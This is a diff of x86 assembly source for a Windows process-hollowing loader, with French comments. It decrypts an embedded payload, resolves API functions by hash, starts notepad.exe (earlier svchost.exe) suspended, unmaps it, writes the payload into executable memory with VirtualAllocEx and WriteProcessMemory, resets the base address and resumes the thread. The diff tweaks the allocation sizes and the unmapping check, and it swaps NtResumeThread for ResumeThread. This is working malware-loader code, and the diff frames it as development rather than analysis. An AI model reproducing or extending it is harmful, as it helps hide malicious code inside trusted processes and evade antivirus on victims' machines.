@@ -17,12 +17,7 @@ PEZOFIMAGE dd RANDOM32
 PEZOFHEADERS dd RANDOM32 
 PEOPTHEADER dd RANDOM32
 
-FILE	db 'c:\WINDOWS\system32\svchost.exe',0
-;C:\Documents and Settings\john\Desktop\runpe.exe',0
-  ;C:\WINDOWS\system32\notepad.exe',0
-	;SIS times 0x44 db 0x0
-	;PIS times 0x10 db 0x0
-
+FILE db 'C:\WINDOWS\system32\notepad.exe',0
 
 %include "payload.inc"
 %include "hashs.inc"
@@ -32,6 +27,7 @@ BOXTITLE db "Message",0
 
 section .text
 PAYLOAD incbin  "payload.bin"
+;PAYLOAD incbin  "nop.exe"
 
 %include "bbcypher.asm"
 %include "dllmgt.asm"
@@ -53,6 +49,10 @@ _start:
 
 	; Decipher payload
 	call _bbdecypher
+	
+	mov eax,PAYLOAD
+	mov	[PEBASE],eax
+
 
 	mov	esi,[PEBASE]
 	lodsw
@@ -116,7 +116,9 @@ _start:
 	; Request memory for process Context
 	invokel _getdll,HASH_KERNEL32.DLL
 	invokel _getfunction, eax, HASH_VIRTUALALLOC
-	invokel eax, NULL, CTX__LEN, MEM_COMMIT, PAGE_READWRITE
+
+	invokel eax, NULL, 4 , MEM_COMMIT, PAGE_READWRITE
+;	invokel eax, NULL, CTX__LEN, MEM_COMMIT, PAGE_READWRITE
 	cmp eax,0
 	je	.end
 	mov	[CTX],eax
@@ -149,15 +151,10 @@ _start:
 	
 	; vRPEBASE est notre nouvelle base addresse.
 
-	
-
-
-
-
 	; Si par malheur la Base address collision avec celle de notre PE packé on Demappe la section
-;	mov eax,[PEIMAGEBASE]  ; base image from PE include file 
-;	cmp	eax,[vRPEBASE]   ; 	base addresse form running PE
-;	jne	.bypassunmap
+	mov eax,[PEIMAGEBASE]  ; base image from PE include file 
+	cmp	eax,[vRPEBASE]   ; 	base addresse form running PE
+	jne	.bypassunmap
 
 	; Unmap le PE si ils sont sur la meme base addresse
 
@@ -169,29 +166,21 @@ _start:
 
 .bypassunmap
 	
-;	; Update la base addresse dans le PE a recopier
-;	mov	eax,[vRPEBASE]
-;	int 3
-;	mov	[PEIMAGEBASE],eax
-;	mov esi,[PEOPTHEADER]
-  ; EDI point sur MAGIC nubrer 10B
-;	 mov [esi + IMAGE_OPTIONAL_HEADER__ImageBase],eax
-	
 	; Realloue la mémoire necessaire dans le procsess
 	invokel _getdll,HASH_KERNEL32.DLL
 	invokel _getfunction, eax, HASH_VIRTUALALLOCEX
 	mov ecx,[PIS]
 	mov	ecx,[ecx+PROCESS_INFORMATION__hProcess]
 	; 3000 --> MEM_COMMIT || MEM_RESERVE
-	invokel eax,ecx, dword [PEIMAGEBASE],dword [PEZOFIMAGE],0x3000,PAGE_EXECUTE_READWRITE
-
+	mov	edx,[PEZOFIMAGE]
+	; add edx,0x1000
+	mov	edx,0x20000
+	invokel eax,ecx, dword [PEIMAGEBASE],edx,0x3000,PAGE_EXECUTE_READWRITE
+	
 
 	mov	[PIMAGEBASE],eax
 	cmp	eax,0
 	je	.end
-
-;	mov	eax,[PEIMAGEBASE]
-;	mov	[PEBASE],eax
 
 	; Recopie les Headers du PE
 	invokel _getdll,HASH_KERNEL32.DLL
@@ -238,10 +227,6 @@ _start:
 	jns	.recopiesect
 
 	; Replace la base addresse du process dans le contexte du process 
-	; WriteProcessMemory(PI.hProcess, LPVOID(CTX->Ebx + 8), LPVOID(&INH->OptionalHeader.ImageBase), 4, NULL);
-	
-	push "BASE"
-	push "ADDR"
 
 	invokel _getdll,HASH_KERNEL32.DLL
 	invokel _getfunction, eax, HASH_WRITEPROCESSMEMORY
@@ -274,15 +259,27 @@ _start:
 
 
 	; Relache la thread
-	invokel _getdll,HASH_NTDLL.DLL
-	invokel _getfunction, eax, HASH_NTRESUMETHREAD
+	invokel _getdll,HASH_KERNEL32.DLL
+	invokel _getfunction, eax, HASH_RESUMETHREAD
 	mov esi,[PIS]
 	mov	esi,[esi+PROCESS_INFORMATION__hThread ]
 
-		invokel eax,esi
+	invokel eax,esi
 
 	; Popup
 	;invoke _MessageBoxA@16, 0, BOXTEXT, BOXTITLE, 0
+
+
+  ; Request for this new process CPU context
+;	  invokel _getdll,HASH_KERNEL32.DLL
+;		  invokel _getfunction, eax, HASH_GETTHREADCONTEXT
+;			  mov ecx,[PIS]
+;				  mov ecx,[ecx+PROCESS_INFORMATION__hThread]
+;					  mov ebx,[CTX]
+;						  invokel eax,ecx,ebx
+
+
+
 
 	%ifdef OBS
 	; Some work for IDA
